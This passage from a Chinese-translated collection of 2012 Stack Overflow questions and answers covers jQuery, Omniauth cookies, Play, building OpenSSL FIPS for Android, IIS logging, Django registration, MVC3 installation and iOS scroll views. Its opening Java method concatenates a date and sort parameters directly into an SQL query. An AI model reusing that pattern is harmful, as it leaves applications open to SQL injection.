                .prepareStatement("Select c.CLAVE, UPPER(s.NOMBRE) AS SUCURSAL, SUM(c.PAG) as PAGINAS, COUNT(c.CLAVE) as EDO_CUENTA,  SUM(c.PAG) * "+m+"as IMPRESION, SUM(c.PAG) * "+m2+" as MENSAJERIA, (SUM(c.PAG) * 2) + (SUM(c.PAG) * 2) as TOTAL FROM Sucursal s, CORTE c where FECHA='"
                        + a
                        + "' AND s.CLAVE = c.CLAVE group by c.CLAVE, c.PAG, NOMBRE ORDER BY "
                        + order+" "+modo);
        ResultSet resultado = stmt.executeQuery();
        String clave;
        String nombre;
        Integer pag;
        Integer edo_cuenta;
        Integer impresion;
        Integer mensajeria;
        Integer total;
        if (resultado.next()) {

            do {
                clave = resultado.getString("CLAVE");
                nombre = resultado.getString("SUCURSAL");
                pag = resultado.getInt("PAGINAS");
                edo_cuenta = resultado.getInt("EDO_CUENTA");
                impresion = resultado.getInt("IMPRESION");
                mensajeria = resultado.getInt("MENSAJERIA");
                total = resultado.getInt("TOTAL");
                list2.add(clave+","+nombre+","+pag.toString()+","+edo_cuenta.toString()+","+impresion.toString()+","+mensajeria.toString()+","+total.toString());
                list.add(new String[] { clave, nombre, pag.toString(), edo_cuenta.toString(), impresion.toString(), mensajeria.toString(),total.toString() });
            } while (resultado.next());
        }
        stmt.close();
        conn.close();
        xls.setVisible(true);
        alert(list.size()+"");
    } catch (SQLException e) {
        e.printStackTrace();
    }
    return list;
} 
```

> 谢谢你的帮助！

# jquery - 如何获取元素的字符串，不包括字符串的兄弟元素？

> ID：11091884
> 
> 赞同：1
> 
> 时间：2012-06-18T22:16:18.363
> 
> 标签：jquery

所以我有这个：

`<span class="a"> String <span class="b">Herp</span> </span>`

我需要将 span.a 的字符串定义为一个变量，而无需获取 span.b 的字符串，例如：

`var a = $(".a").text();`

我该怎么做？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:19:10.350

```
var a = $(".a")[0].firstChild.nodeValue; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:41:04.420

**[演示](http://jsfiddle.net/roXon/Hs9CT/)**

```
var txt1 = $(".a").contents().filter(function() {
  return this.nodeType == 3;
}).text(); 
```

* * *

或喜欢：

```
var txt1 = $('.a')[0].childNodes[0].nodeValue; 
```

**[演示 2](http://jsfiddle.net/roXon/Hs9CT/1/)**

# jquery - jQuery 工具：使选项卡窗格高度可变

> ID：11091889
> 
> 赞同：1
> 
> 时间：2012-06-18T22:16:39.190
> 
> 标签：jquery, css, jquery-tools

我已经删除了 div.pane 和 .carousel div 的高度，以便它们在高度上扩展以适应更长的 H3 ......但现在面板（例如它们周围的边框）已经折叠......并且无法解决如果/我需要一个clearfloat ...

[http://jsfiddle.net/fJQmU/8/](http://jsfiddle.net/fJQmU/8/)

从 .carousel div 中删除 position:absolute 解决了这个问题......但会破坏动画

（PS。选中时第二个选项卡右侧下方也有1px间隙的问题）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T23:23:07.383

在这种情况下，只需添加此 jquery 代码。这将解决问题

```
$(".carousel").height($(".carousel div").height()); 
```

[演示在这里](http://jsfiddle.net/fJQmU/14/)

# jquery - Jquery 文本在不打算悬停时具有不透明度（在图像上）

> ID：11091892
> 
> 赞同：0
> 
> 时间：2012-06-18T22:16:55.693
> 
> 标签：jquery, css, hover, opacity

很难在标题中解释，但可以在您访问[www.compuhex.co.uk](http://www.compuhex.co.uk)时看到。当您将鼠标悬停在图像上时，文本会出现在图像上方，并且原始图像的不透明度会增加。出于某种原因，现在文本的不透明度水平也会受到影响，而这并不意味着它会受到影响。它并不总是这样，对于我的生活，我无法弄清楚如何解决它。

**html**的代码片段是；

```
<div class="wrapper"> 
    <img src="products/Pink2.PNG" width="75%" style="padding-top:15px" alt="USB Pink cable for Apple iPhone"/>  
    <a href="pink_iphone.html" title="" class="description"><span class="productimagetext">
    USB pink sync charger cable for iPhone<br /><br /> £1.99</span></a>
</div> 
```

**css**

```
.wrapper{ padding: 8px; background-color: #FFF; border: none; position: relative; width:260; height: 200; margin: 0 auto; }
.wrapper:hover{ cursor: pointer; }
.description{ display: none; background-color: #fff; color: #000; position: absolute; left: 8px; top:10px; width: 260px; height: 200px; padding: 30px 0 0 0; }
.description img{ vertical-align: middle; margin: 0 2px 1px 0; } 
```

**jQuery**是；

```
$('.wrapper').hover(function(){
    $(this).children('.description').stop().show().fadeTo(200, 0.8);
},function(){
    $(this).children('.description').stop().hide().fadeTo(200, 0);
}); 
```

它可以在[www.compuhex.co.uk](http://www.compuhex.co.uk)上看到。请注意，该网站仍在部分建设中。

# ruby - 使用 Omniauth 进行身份验证时，我应该在 cookie 中存储哪些数据？

> ID：11091894
> 
> 赞同：1
> 
> 时间：2012-06-18T22:17:07.717
> 
> 标签：ruby, oauth, sinatra

我正在使用 Sinatra 和 Omniauth（特别是 google oauth2）为网站提供服务。我对哪些数据可以安全地存储在 cookie 中以及哪些数据不安全感到有些困惑。

我倾向于说`authorized => true`，一旦我确认 AuthHash 包含访问令牌，我应该简单地在 cookie 中存储一个字段。cookie 使用`Rack::Sesssion::Cookie`和进行保护`:secret => "some-really-long-and-strong-password"`。这种想法正确吗？

此外，如果有人想入侵网站（即登录而不实际登录），他们需要做的就是成功破解 cookie 的秘密并用 制作一个假 cookie `authorized => true`，对吗？

我看不到存储存储在凭据部分中的实际访问密钥的任何价值`Omniauth::AuthHash`，因为这似乎是敏感信息......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-19T00:16:35.173

> 我对哪些数据可以安全地存储在 cookie 中以及哪些数据不安全感到有些困惑。

一般来说，如果有人窃取了用户 cookie，这是最糟糕的情况：

*   劫持用户会话
*   窃取 cookie 中包含的所有数据
*   获得未经授权的访问

我认为您想要使用的是一种真实性令牌，您可以来回传递以验证用户及其请求的真实性。

**参考**

*   [维基百科上的跨站请求伪造](https://en.wikipedia.org/wiki/Cross-site_request_forgery)

我会特别查看[示例和特征](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Example_and_characteristics)以及[预防](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Prevention)部分。

# objective-c - ARC 损坏的 Sudzc ObjC 代码

> ID：11091899
> 
> 赞同：1
> 
> 时间：2012-06-18T22:17:33.890
> 
> 标签：objective-c, web-services, sudzc

我正在使用 Sudzc 为 iOS 应用程序创建我的 WebService 代理类。该项目是为 ARC 配置的，所以我使用的是 ARC Sudzc 配置文件。

问题是，一旦我下载生成的代码。如果我打开示例 Xcode 项目。它在 SoapObject.m 中总是有许多错误，这显然是重新分发的库的一部分。

一个奇怪的问题是：当头文件就在那里并且助手立即将其拉起时，找不到“SoapObject”的接口声明。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T13:03:17.953

非常简单的解决方案。一定是闭着眼睛发育的。

Sudzc 的 ARC 代码生成似乎有一个小故障，它错过了 2 个导入语句。

刚卡住：

```
#import "Soap.h"
#import "SoapObject.h" 
```

上面的实现在 SoapObject.m 中排序。

# scala - 在 Play 中定义全局变量的最佳方式！2.0应用

> ID：11091902
> 
> 赞同：3
> 
> 时间：2012-06-18T22:17:47.823
> 
> 标签：scala, playframework, playframework-2.0

在玩！2.0，可以`Global`按照[此处](http://www.playframework.org/documentation/2.0/ScalaGlobal)记录的方式使用。`Global`需要在默认（空）包中。

我的应用程序中还需要全局变量，其中一些需要可用于`Global`. 因此，我将它们放在 Global.scala 中，如下所示：

```
package object globals {
  lazy val foo = Play.maybeApplication.flatMap(_.configuration.getString("foo")).getOrElse("default_value_of_foo")
} 
```

然后我在我的控制器中使用它，如下所示：

```
globals.foo 
```

有没有更好的办法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T10:54:55.360

我认为这个问题更多的是关于一般软件设计，而不是关于 Play Framework。如果你真的需要一堆随机属性，为什么不创建自己的对象呢？

```
object Configuration {
    val timeout = Play.maybeApplication.flatMap(
                      _.configuration.getString("timeout")
                      ).getOrElse(0))
} 
```

但通常这些值属于正在配置的某个其他逻辑实体。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-20T14:41:32.117

我在使用 Global 作为我的应用程序的单例时遇到了问题。我认为从控制器访问单例也会遇到一些问题（请参阅[这篇文章](https://stackoverflow.com/q/10440864/595223)）。

但是您可以在其中一个包中创建自己的单例，并按照您的计划访问它。

# java - java servlet 谷歌在应用程序支付

> ID：11091903
> 
> 赞同：0
> 
> 时间：2012-06-18T22:17:54.073
> 
> 标签：java, web, in-app-purchase

我研究了应用程序计费代码片段中的 java

[https://developers.google.com/in-app-payments/docs/tutorial](https://developers.google.com/in-app-payments/docs/tutorial)

而且我无法使用它来使我的应用程序能够进行应用程序支付。

我的第一个问题是如何设置一个 servlet 来处理付款请求。我是否将 getJWT() 方法放在 servlet 中并从 doPost() 方法中调用它？

我的第二个问题是如何处理 getJWT() 返回的字符串？应该是保存采购信息的json对象，但是不知道我手上的jsp文件应该怎么处理。

我已经搜索了使用 java servlet 和 jsps 来研究的示例代码，但没有找到。我找到了python代码，但我还不能将python翻译成java。如果有人知道使用 java servlet 和 jsps 在应用程序计费中使用 google 的示例（完整），如果您也可以发布链接，我将不胜感激。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T22:21:53.043

在服务器上，您需要一个 HttpServlet 派生类，该类接受订单请求（在 doPost() 中），调用 JWT 库以及卖方机密以生成签名的 JWT 字符串，然后在响应中返回结果。

在 HTML 页面的客户端，您可以使用模板系统（例如 AppEngine + JSP）或对您的 servlet 的 Ajax 调用来获取生成的 JWT。

生成的 JWT 是 goog.payments.inapp.buy() JavaScript API 的参数之一。

下面是应用内付款的简单 AppEngine Python 实现。您可以重用客户端代码并将服务器端替换为 Java 实现：

[https://code.google.com/p/iap-python/](https://code.google.com/p/iap-python/)

# android - 安卓，构建 openssl-fips-2.0

> ID：11091905
> 
> 赞同：3
> 
> 时间：2012-06-18T22:18:05.220
> 
> 标签：android, openssl, android-ndk

尝试使用 NDK 构建 openssl-fips-2.0 之前，我很幸运地找到了这个链接并且很容易做到了。 [https://github.com/guardianproject/openssl-android](https://github.com/guardianproject/openssl-android)

现在尝试对最新的 openssl-fips-2.0 做同样的事情，从这里获得源代码：http: [//opensslfoundation.com/testing/validation-2.0/](http://opensslfoundation.com/testing/validation-2.0/)

我是否必须遵循有关交叉编译的文档才能进行构建？更简单的方法？

提前致谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-23T15:19:49.353

如何使用 android-ndk-r8 在 Mac OS X 10.7 上构建 OpenSSL FIPS 2.0

1.  安装JDK、android-sdk、android-ndk

2.  在 Mac 上安装 GCC

    ```
    Xcode\Preferences\Components\Command Line Tools\install. 
    ```

3.  构建环境设置：

    ```
    $ANDROID_NDK_HOME is my android-ndk folder
    export ANDROID_NDK=$ANDROID_NDK_HOME
    export FIPS_SIG=$PWD/util/incore
    export PATH="$ANDROID_NDK/toolchains/arm-linux-androideabi-4.4.3/prebuilt/linux-x86/bin":$PATH
    export MACHINE=armv7l
    export RELEASE=2.6.32.GMU
    export SYSTEM=android
    export ARCH=arm
    export CROSS_COMPILE="arm-linux-androideabi-"
    export ANDROID_DEV="$ANDROID_NDK/platforms/android-14/arch-arm/usr" 
    export HOSTCC=gcc 
    ```

4.  构建 fips openssl 模块：

    ```
    gunzip -c openssl-fips-2.0.tar.gz | tar xf -
    cd openssl-fips-2.0/
    ./config
    make
    make install # copy files to /usr/local/ssl/ 
    ```

5.  构建支持 fips 的 openssl 库 (.a)

    ```
    gunzip -c openssl-1.0.1c.tar.gz | tar xf -
    cd openssl-1.0.1c/
    ./config fips --with-fipslibdir=/usr/local/ssl/fips-2.0/lib/ 
    make depend
    make 
    ```

你去吧。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T04:22:54.773

为什么？如果您必须修改构建脚本，则生成的模块将不符合 FIPS，并且您肯定需要修改以在 Android 上构建。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T19:01:29.010

谢谢 Nikolay 和 brewphone 。如果我能早点找到你的帖子，那就太好了。我已经设法为我的手机构建了 fips-openssl。我必须在 fipsld 脚本中添加一点 awk 片段才能使其正常工作。(openssl-fips-1.2.3)

brewphone，我有来自构建的 libcrypto.a 和 libssl.a，我静态链接它们以为我的应用程序创建一个库。这是最好的方法吗？

谢谢！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T16:40:27.443

如果其他人遇到与我相同的问题，通过 brewphone 实现上述工作的关键（感谢您的洞察力）是将未剥离的库打包为内容，然后将它们复制到应用程序数据文件夹之后并且成功`System.load("/data/data/myapp/files/libcrypto.so.1.0.0")`了`System.load("/data/data/myapp/files/libssl.so.1.0.0")`。

有趣的是，只是更改 makefile 以将版本号放在 .so 扩展名之前会导致指纹失败，即使 fips 的东西没有被触及。

brewphone，如果您设法以另一种方式做到这一点，请告诉我:)

# cocoa - 如何翻译和缩放 NSImage？

> ID：11091906
> 
> 赞同：0
> 
> 时间：2012-06-18T22:18:07.697
> 
> 标签：cocoa, translate, nsimage, nsimageview, nsaffinetransform

到目前为止，我已经构建了一个允许用户将图像拖放到 NSImageView 上的应用程序。但是，我希望能够通过简单地单击任何图像并按住鼠标按钮来移动它的位置来移动这些图像。

设置图像后如何操作 NSImageView 进行平移/缩放？那可能吗？我已经阅读了有关 NSAffineTransform 的信息，但它似乎是在创建图像本身之前移动图像。我已经在画布上有图像，我只想单击并按住图像并用鼠标移动它。请帮助任何人！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:30:08.000

这有两个方面。

**`NSImage`**是模型对象，您可能希望以不同的方式显示它，保存到磁盘/存档等。如果您想实际更改*模型*（缩放、旋转等），这意味着永久更改，那么您将大概想看看`NSAffineTransform`，石英图等。

但你可能不是那个意思。相反，您可能对 感兴趣**`NSImageView`**，它是一个视图对象，`NSImage`使用所需的任何显示属性显示模型对象的内容。如果您只想更改图像的显示方式，而不是图像中的实际字节，那么您将`NSImageView`在运行时操作。您也可以`NSAffineTransform`在此处使用，但这有点不常见（通常是不必要的）。

需要注意的关键是`NSImageView`继承自[`NSView`](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/nsview_Class/Reference/NSView.html)，因此您可以使用它的所有功能。看看某些方法，例如：

`-setFrameSize:`- 可用于更改视图大小，从而更改图像显示比例

`-setFrameOrigin:`- 用于改变视图位置，从而改变明显的图像位置

再次注意，这些与图像本身无关，适用于所有 Cocoa 视图。你可能想看看像[Cocoa Programming for Mac OS X](https://rads.stackoverflow.com/amzn/click/com/0321774086)这样的书，让你了解基础知识。（然后你可以做更多有趣的事情，比如旋转、动画等）

# iis - 如何使用 windows server 2003 上的经典 asp 应用程序跟踪 iis 日志中的会话

> ID：11091907
> 
> 赞同：0
> 
> 时间：2012-06-18T22:18:20.693
> 
> 标签：iis, windows-server-2003

我想使用我的 IIS 日志来跟踪我的应用程序中的会话，但在我的页面中没有沿着查询字符串推送会话密钥。

在日志中开始跟踪的最简单方法是什么 - 在 iis 日志中放置一个查询字符串值，或者有没有办法将会话作为自定义字段附加到日志？

针对 windows server 2003 64 位使用 32 位经典 asp。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:22:09.897

IIS（至少从版本 5 开始）允许您以“W3C 扩展”日志文件格式记录 cookie。将“cs-cookie”字段添加到您的日志并重新启动您的网站，它们会出现在那里。

但是，您将需要支持通过 cs-cookie 字段跟踪会话的日志分析软件 - 但它在很大程度上不是必需的，因为大多数日志分析通过跟踪 cs-referer 标头来跟踪路径通过站点和会话。

如果您有较大的 cookie 字符串，那么您的站点日志文件的大小会膨胀。

# python - 如何从表单中获取用户名？

> ID：11091910
> 
> 赞同：-1
> 
> 时间：2012-06-18T22:18:33.713
> 
> 标签：python, django, forms

我今天遇到了一个特殊的情况。以前我的 view.py 中有以下内容

```
def register_page(request):
    if request.method == 'POST':
        form = RegistrationForm(request.POST)
        if form.is_valid():
            user = User.objects.create_user(
                username=form.cleaned_data['username'],
                password=form.cleaned_data['password2'],
                email=form.cleaned_data['email']
            )
            return HttpResponseRedirect('/register/success/')
    else:
        form = RegistrationForm()
    variables = RequestContext(request, {'form':form})
    return render_to_response('registration/register.html', variables) 
```

在她注册后检索用户名、电子邮件和密码以创建新用户非常简单。但是现在我已经将它重构为使用哈希码作为用户名，并单独使用电子邮件进行注册和登录。

缩短的 RegistrationForm 如下所示：

```
class RegistrationForm(forms.ModelForm):
   email = forms.EmailField(label=_("Email"))
   password1 = forms.CharField(label=_("Password"), widget=forms.PasswordInput)
   password2 = forms.CharField(label=_("Password confirmation"), widget=forms.PasswordInput))

   class Meta:
        model = User
        fields = ("email",)

   def save(self, commit=True):
        user = super(RegistrationForm, self).save(commit=False)
        user.set_password(self.cleaned_data["password1"])
        email = self.cleaned_data['email']
        user.username = md5(email).digest().encode('base64')[:-1]
        if commit:
            user.save()
        return user 
```

新表单不再有用户名，因为它是计算出来的，不再由用户输入。但是如何从视图中检索用户名？新代码不是来自我，而是来自博客。也许关键在 Meta 类中？从文档中，我无法完全理解他试图通过 Meta 类在这里实现的目标......

非常感谢，

**编辑**：

好的，我想我现在明白子类化应该如何工作了。我试图像这样子类化 User 类：

```
class cb_user_model_backend(ModelBackend):

    def create_user(self, email=None, password=None):
        """
        Creates and saves a User with the given email and password only.
        """
        now = timezone.now()
        username = md5(email).digest().encode('base64')[:-1]
        email = UserManager.normalize_email(email)
        user = self.model(username=username, email=email,
            is_staff=False, is_active=True, is_superuser=False,
            last_login=now, date_joined=now)

        user.set_password(password)
        user.save(using=self._db)
        return user 
```

我现在面临的问题是两个错误，self._db 和 self.model，本应在基本用户类上。如何从这里到达他们？

**编辑2：**

PyCharm 抱怨两个 self._db 和 seld.model 不会在当前 cb_user_model_backend 上退出。

请注意，视图被重构为采用两个参数：

```
user = User.objects.create_user(
                password=form.cleaned_data['password2'],
                email=form.cleaned_data['email']
            ) 
```

运行它时，堆栈跟踪是：

```
Exception Type: TypeError
Exception Value:    
create_user() takes at least 2 arguments (3 given) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:28:06.203

尝试在你的 models.py 中子类化你的保存方法：

```
def save(self, *args, **kwargs):
    if not self.id:
        self.username = md5(self.email).digest().encode('base64')[:-1]
    super(ModelName, self).save(*args, **kwargs) 
```

调用 user.save() 后，user.username 应该在您的视图中生成生成的用户名。希望这可以帮助。

编辑：如果您想调用 create_user(**kwargs)，您可以在您的 views.py 中执行以下操作：

```
email = self.cleaned_data['email']
username = md5(email).digest().encode('base64')[:-1]
u = User.objects.create_user(username = username, email = email, password = password) 
```

# c# - 如何创建一个继承自实体对象的类？？？（实体框架）

> ID：11091917
> 
> 赞同：0
> 
> 时间：2012-06-18T22:19:14.480
> 
> 标签：c#, silverlight, entity-framework

我有一个 Silverlight 业务应用程序，我正在使用实体框架数据模型，并且我有一个名为 Clients 的实体类，具有一些属性：Name、LastName、Address 等。我需要创建一个从 Clients 类继承的类，我需要这样的东西...

```
public class ClientWithSubClients : Clients
{
    public bool HasSubClients { get; set; }
    public List<Clients> SubClients { get; set; }
} 
```

我需要它在同一个类中，客户端的信息和子客户端的信息......在服务器端工作正常，但我需要在客户端使用它，而在 silverlight 项目中我不能查看类定义...任何想法...

谢谢...米格尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T01:21:39.797

您将无法直接在 Silverlight 中查看实体框架类型，因为 EF 依赖于完整的 .net 框架，并且在您的情况下是一种仅限服务器的技术。

要将 EF 类型公开给 Silverlight 客户端，您需要某种服务器端服务作为包装器。我已经使用 WCF 数据服务 (http://msdn.microsoft.com/en-us/data/odata.aspx) 来满足这个确切的要求，并且效果很好。WCF RIA 服务 (http://www.silverlight.net/learn/advanced-techniques/wcf-ria-services/get-started-with-wcf-ria-services) 也是另一种选择。

我认为，如果您只想让 Silverlight 客户端使用您的数据，那么 WCF RIA 服务是最佳选择。如果您想要更广泛的可访问服务，请使用 WCF 数据服务。

我们使用 WCF 数据服务，因为我们有使用这些服务的 silverlight 应用程序、WPF 应用程序，甚至是 Excel 电子表格。

# asp.net-mvc - 无法安装 Asp.net MVC 3

> ID：11091919
> 
> 赞同：15
> 
> 时间：2012-06-18T22:19:32.313
> 
> 标签：asp.net-mvc, windows, asp.net-mvc-3, windows-7

我尝试使用网络安装平台和手动安装，但都不起作用。

我正在尝试首先安装 AspNetMVC3ToolsUpdateSetup.exe 但它总是失败并出现致命错误

```
OS Version = 6.1.7601, Platform 2, Service Pack 1
OS Description = Windows 7 - x64 Enterprise Edition Service Pack 1
CommandLine = c:\temp\ext27692\setup.exe
TimeZone = Pacific Daylight Time
Initial LCID = 1033
Using Simultaneous Download and Install mechanism
Operation: Installing
Package Name = Microsoft ASP.NET MVC 3 Tools Update
Package Version = 3.0.20406.0
User Experience Data Collection Policy: AlwaysUploaded
Number of applicable items: 5
MSI (c:\temp\ext27692\AspNetWebPages.msi) Installation succeeded. Msi Log: Microsoft ASP.NET MVC 3 Tools Update_20120618_145125927-MSI_AspNetWebPages.msi.txt
MSI (c:\temp\ext27692\AspNetWebPagesVS2010Tools.msi) Installation succeeded. Msi Log: Microsoft ASP.NET MVC 3 Tools Update_20120618_145125927-MSI_AspNetWebPagesVS2010Tools.msi.txt
MSI (c:\temp\ext27692\AspNetMVC3.msi) Installation succeeded. Msi Log: Microsoft ASP.NET MVC 3 Tools Update_20120618_145125927-MSI_AspNetMVC3.msi.txt
MSI (c:\temp\ext27692\AspNetMVC3VS2010Tools.msi) Installation succeeded. Msi Log: Microsoft ASP.NET MVC 3 Tools Update_20120618_145125927-MSI_AspNetMVC3VS2010Tools.msi.txt
MSI (c:\temp\ext27692\NuGet.msi) Installation failed. Msi Log: Microsoft ASP.NET MVC 3 Tools Update_20120618_145125927-MSI_NuGet.msi.txt
MSI (c:\temp\ext27692\AspNetMVC3VS2010Tools.msi) Uninstall succeeded. Msi Log: Microsoft ASP.NET MVC 3 Tools Update_20120618_145125927-MSI_AspNetMVC3VS2010Tools.msi.txt
MSI (c:\temp\ext27692\AspNetMVC3.msi) Uninstall succeeded. Msi Log: Microsoft ASP.NET MVC 3 Tools Update_20120618_145125927-MSI_AspNetMVC3.msi.txt
MSI (c:\temp\ext27692\AspNetWebPagesVS2010Tools.msi) Uninstall succeeded. Msi Log: Microsoft ASP.NET MVC 3 Tools Update_20120618_145125927-MSI_AspNetWebPagesVS2010Tools.msi.txt
MSI (c:\temp\ext27692\AspNetWebPages.msi) Uninstall succeeded. Msi Log: Microsoft ASP.NET MVC 3 Tools Update_20120618_145125927-MSI_AspNetWebPages.msi.txt
Final Result: Installation failed with error code: (0x80070643), "Fatal error during installation. " (Elapsed time: 0 00:14:10). 
```

我试图在[这里](http://blog.williamhilsum.com/2011/03/error-0x80070643-installing-aspnet-mvc.html)进行修复，但它对我不起作用。

![安装进度](../Images/c2ca4ac6ed1d88f3159060d4a643b475.png)

我比您在上面的屏幕截图中看到的更进一步，因为它似乎达到了我认为是 nuget 的内容，然后立即回滚。它发生得太快了，我无法好好看看。

我确实安装了 Visual Studios 2010 SP1。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-05-07T01:34:16.867

我是如何让我的工作的：

1.  下载并运行`AspNetMVC3ToolsUpdateSetup.exe`，让它解压文件但不接受许可条款并点击安装
2.  这创建了文件夹`C:\temp\ext27692`，并且在此文件夹中是安装中使用的所有必需的安装文件和配置。如果您查看文件夹的内容，您会注意到有一个`nuget.msi`安装文件。请注意，您计算机上的 VS 已经有最新版本，因此无需安装。
3.  `C:\temp\ext27692`在第 1 点的执行仍在运行时，快速制作文件夹的副本，然后单击“取消”。这将回滚并删除它创建的内容。
4.  在`C:\temp\ext27692`您在第 3 点中创建的副本中，找到该文件`parameterinfo.xml`并使用文本编辑器打开它
5.  在打开的文件中找到以下行`parameterinfo.xml`并将其删除

    ```
    <MSI CanonicalTargetName="NuGet"
         DownloadSize="756736"
         EstimatedInstallTime="849920"
         HashValue="74F464AC4E7220775472D5DF08CE7842958BC53FB8B569E0917CEAEEFB82209C"
         InstalledProductSize="838144"
         Name="NuGet.msi"
         ProductCode="{A5630CB0-6D3C-4C93-9A51-03BEB835A982}"
         Rollback="true"
         SystemDriveSize="100">
        <IsPresent>
            <Exists>
                <MsiProductVersion ProductCode="Self" />
            </Exists>
        </IsPresent>
        <ApplicableIf>
            <Or>
                <Or>
                    <Or>
                        <LessThanOrEqualTo LeftHandSide="30319.01" BoolWhenNonExistent="false">
                            <RegKeyValue Location="HKLM\Software\Microsoft\DevDiv\VS\Servicing\10.0\vstscore\Version"/>
                        </LessThanOrEqualTo>
                        <LessThanOrEqualTo LeftHandSide="30319.01" BoolWhenNonExistent="false">
                            <RegKeyValue Location="HKLM\Software\Microsoft\DevDiv\VS\Servicing\10.0\vstdcore\Version"/>
                        </LessThanOrEqualTo>
                    </Or>
                    <LessThanOrEqualTo LeftHandSide="30319.01" BoolWhenNonExistent="false">
                        <RegKeyValue Location="HKLM\Software\Microsoft\DevDiv\VS\Servicing\10.0\procore\Version"/>
                    </LessThanOrEqualTo>
                </Or>
                <LessThanOrEqualTo LeftHandSide="30319.01" BoolWhenNonExistent="false">
                    <RegKeyValue Location="HKLM\Software\Microsoft\DevDiv\vns\Servicing\10.0\xcor\Version"/>
                </LessThanOrEqualTo>
            </Or>
        </ApplicableIf>
        <ActionTable>
            <InstallAction IfPresent="noop" IfAbsent="install" />
            <UninstallAction IfPresent="uninstall" IfAbsent="noop" />
            <RepairAction IfPresent="repair" IfAbsent="install" />
        </ActionTable>
    </MSI> 
    ```

6.  保存`parameterinfo.xml`

7.  在`C:\temp\ext27692`您制作的副本中，现在找到该文件`setup.exe`并执行它。

这将安装 MVC3，但不会安装旧版本的 NuGet。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-06-19T01:53:36.437

您可能需要检查几个选项：

1.  检查已`control panel`安装的 MVC 框架版本
2.  按照5-4-3降序卸载
3.  出现nuget错误时尝试以下顺序

> *   卸载 Nuget
> *   安装 MVC
> *   安装最新的 nuget

注意：除了 ASP.NET MVC3，如果你有最新版本的 MVC (4,5,6)，你应该记得按降序卸载它们。

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2013-01-25T08:02:54.623

1.  使用控制面板卸载 MVC 4。
2.  使用独立安装程序安装 MVC 3：http: [//www.microsoft.com/en-us/download/details.aspx?](http://www.microsoft.com/en-us/download/details.aspx?id=1491) id= 1491 (AspNetMVC3ToolsUpdateSetup.exe)。
3.  使用 Web 平台安装程序安装 MVC 4。

这个对我有用。我没有接触 NuGet。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-01-08T11:21:06.093

如果您之前还安装了 ASP.NET MVC4，我还必须从控制面板 -> 程序中**卸载 Microsoft ASP.NET 网页。**

然后我使用网络平台安装程序进行安装，一切正常！

# iphone - UI滚动视图。内部有许多 UIView 的页面控制器

> ID：11091923
> 
> 赞同：0
> 
> 时间：2012-06-18T22:20:11.587
> 
> 标签：iphone, objective-c, ios, uiscrollview

我有 2 个视图与 NavigationController 连接。第二个视图是带有页面控件的滚动视图。我的主视图有 1 个 UIButton。当按下它时获得 3-4 秒的延迟。scrollView 中有 21 个视图。而且我在scrollView中的视图之间滚动时会突然出现。如何减少延迟并消除突发？

我的`viewDidLoad`方法：

```
-(void)viewDidLoad {
self.pageControl = [[UIPageControl alloc] initWithFrame:CGRectMake(0.0f, 280.0f, 320.0f, 20.0f)];
[self.view addSubview:self.pageControl];

self.scrollView = [[UIScrollView alloc] initWithFrame:CGRectMake(0.0f, 30.0f, 480.0f, 250.0f)];
[self.view addSubview:self.scrollView];

pageControlBeingUsed = NO;

NSInteger firstNumber = 1;
for (NSUInteger i = 0; i < 20; i++) {
    BIDExercisePrototype *view = [[BIDExercisePrototype alloc] initWithNumber:firstNumber];
    [self.viewsArray addObject:view];
    firstNumber += 50;
}

for (NSUInteger i = 0; i < 20; i++) {
    UIViewController *someController = [[UIViewController alloc] init];
    someController = [self.viewsArray objectAtIndex:i];
    someController.view.frame = CGRectMake(480.0f*i, 0.0f, 480.0f, 280.0f);
    [self.scrollView addSubview:someController.view];
}
self.scrollView.contentSize = CGSizeMake(self.scrollView.frame.size.width * self.viewsArray.count, self.scrollView.frame.size.height);
self.pageControl.backgroundColor = [UIColor clearColor];
self.pageControl.currentPage = 0;
self.pageControl.numberOfPages = self.viewsArray.count;
self.scrollView.showsVerticalScrollIndicator = NO;
self.scrollView.showsHorizontalScrollIndicator = NO;
self.scrollView.pagingEnabled = YES;
self.scrollView.delegate = self;
[self.pageControl addTarget:self action:@selector(changePage) forControlEvents:UIControlEventValueChanged];
}

- (void)scrollViewDidScroll:(UIScrollView *)sender {
if (!pageControlBeingUsed) {
    CGFloat pageWidth = self.scrollView.frame.size.width;
    int page = floor((self.scrollView.contentOffset.x - pageWidth / 2) / pageWidth) + 1;
    self.pageControl.currentPage = page;
}
    }

    - (void)scrollViewWillBeginDragging:(UIScrollView *)scrollView {
pageControlBeingUsed = NO;
    }

    - (void)scrollViewDidEndDecelerating:(UIScrollView *)scrollView {
pageControlBeingUsed = NO;
    }

    - (void)changePage {
CGRect frame;
frame.origin.x = self.scrollView.frame.size.width * self.pageControl.currentPage;
frame.origin.y = 0;
frame.size = self.scrollView.frame.size;
[self.scrollView scrollRectToVisible:frame animated:YES];

pageControlBeingUsed = YES;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T06:45:37.797

我可以建议您忘记重新编码轮子（可以这么说）并使用已经解决问题的[现有项目](https://github.com/nicklockwood/iCarousel)

* * *

## 回答 #2

> 赞同：1
> 
